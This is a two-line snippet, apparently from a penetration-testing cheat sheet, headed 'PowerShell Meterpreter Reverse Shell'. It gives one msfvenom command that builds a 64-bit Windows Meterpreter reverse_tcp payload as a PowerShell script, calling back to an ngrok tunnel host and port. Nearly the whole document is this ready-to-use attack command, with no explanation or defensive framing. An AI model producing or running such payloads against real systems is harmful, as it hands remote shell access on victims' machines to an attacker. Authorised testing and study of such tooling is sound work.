## PowerShell Meterpreter Reverse Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=2.tcp.ngrok.io LPORT=17151 -f psh -o meterpreter-64.ps1
